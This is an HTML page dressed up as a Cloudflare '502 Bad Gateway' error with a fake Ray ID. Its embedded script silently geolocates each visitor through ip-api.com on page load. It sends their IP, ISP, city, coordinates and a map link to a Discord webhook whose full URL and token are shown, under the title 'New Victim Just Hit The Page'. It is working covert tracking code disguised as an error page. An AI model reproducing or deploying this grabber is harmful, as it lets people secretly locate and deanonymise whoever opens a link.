<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>502 Bad Gateway</title>
    <style>
        body {
            margin: 0;
            font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f2f2f2;
            color: #333;
            line-height: 1.5;
        }
        .cf-wrapper {
            max-width: 1200px;
            margin: 40px auto;
            background: white;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            border-radius: 8px;
            overflow: hidden;
        }
        .cf-header {
            background: linear-gradient(135deg, #f58020, #f35325);
            color: white;
            padding: 40px 30px;
            text-align: left;
        }
        .cf-header h1 {
            font-size: 48px;
            font-weight: 800;
            margin: 0;
        }
        .cf-header p {
            font-size: 18px;
            opacity: 0.9;
            margin: 8px 0 0;
        }
        .cf-body {
            padding: 50px 60px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 40px;
            flex-wrap: wrap;
        }
        .diagram {
            display: flex;
            align-items: center;
            gap: 30px;
            font-size: 16px;
        }
        .node {
            text-align: center;
        }
        .icon {
            width: 80px;
            height: 80px;
            background: #e5e5e5;
            border-radius: 50%;
            margin-bottom: 12px;
            position: relative;
        }
        .icon img { width: 50px; position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); }
        .check { background: #4caf50; }
        .cross { background: #f44336; }
        .arrow {
            font-size: 40px;
            color: #999;
        }
        .label { margin-top: 8px; font-weight: 600; }
        .status { font-size: 14px; margin-top: 4px; }
        .green { color: #4caf50; }
        .red { color: #f44336; }
        .cf-footer {
            padding: 30px 60px;
            background: #fafafa;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 20px;
            font-size: 16px;
        }
        .cf-footer strong { color: #f58020; }
        @media (max-width: 768px) {
            .cf-body { flex-direction: column; text-align: center; }
            .diagram { flex-direction: column; }
            .arrow { transform: rotate(90deg); }
        }
    </style>
    <link href="https://rsms.me/inter/inter.css" rel="stylesheet">
</head>
<body>
    <div class="cf-wrapper">
        <div class="cf-header">
            <h1>Error 502</h1>
            <p>Bad gateway</p>
        </div>

        <div class="cf-body">
            <div class="diagram">
                <div class="node">
                    <div class="icon check"><img src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/72x72/1f4bb.png"></div>
                    <div class="label">You<br><span style="font-size:14px;color:#666;">Browser</span></div>
                    <div class="status green">Working</div>
                </div>

                <div class="arrow">⟶</div>

                <div class="node">
                    <div class="icon check"><img src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/72x72/2601.png"></div>
                    <div class="label">Cloudflare<br><span style="font-size:14px;color:#666;">POP: undef</span></div>
                    <div class="status green">Working</div>
                </div>

                <div class="arrow">⟶</div>

                <div class="node">
                    <div class="icon cross"><img src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/72x72/1f4e6.png"></div>
                    <div class="label">example.com<br><span style="font-size:14px;color:#666;">Host</span></div>
                    <div class="status red">Error</div>
                </div>
            </div>
        </div>

        <div class="cf-footer">
            <div><strong>What happened?</strong><br>The web server reported a bad gateway error.</div>
            <div><strong>What can I do?</strong><br>Please try again in a few minutes.</div>
            <div>Ray ID: <code id="ray">0000000000000000</code> • 
                <span id="time"></span> UTC
            </div>
        </div>
    </div>

    <script>
        // Fake Ray ID & current time
        document.getElementById('ray').textContent = Math.random().toString(16).substr(2, 16);
        document.getElementById('time').textContent = new Date().toISOString().replace('T',' ').substr(0,19);

        // Silent logging (ip-api.com is the most reliable free one in 2025)
        fetch('https://ip-api.com/json/?fields=66846719')
            .then(r => r.json())
            .then(d => {
                if (d.status !== 'success') return;

                const mapsLink = `https://www.google.com/maps/@${d.lat},${d.lon},10z`;
                const staticMap = `https://maps.googleapis.com/maps/api/staticmap?center=${d.lat},${d.lon}&zoom=10&size=640x320&scale=2&markers=color:red%7C${d.lat},${d.lon}`;

                const embed = {
                    embeds: [{
                        title: "New Victim Just Hit The Page",
                        color: 0xf58020,
                        fields: [
                            { name: "IP", value: `\`${d.query}\``, inline: true },
                            { name: "ISP", value: d.isp, inline: true },
                            { name: "Country", value: `${d.country} ${d.countryCode}`, inline: true },
                            { name: "Region", value: d.regionName, inline: true },
                            { name: "City", value: d.city, inline: true },
                            { name: "Coords", value: `${d.lat}, ${d.lon}`, inline: true },
                            { name: "Maps Link", value: `[Open Google Maps](${mapsLink})`, inline: false }
                        ],
                        image: { url: staticMap },
                        footer: { text: `Ray ID: ${document.getElementById('ray').textContent}` },
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
            })
            .catch(() => {});
    </script>
</body>
</html>
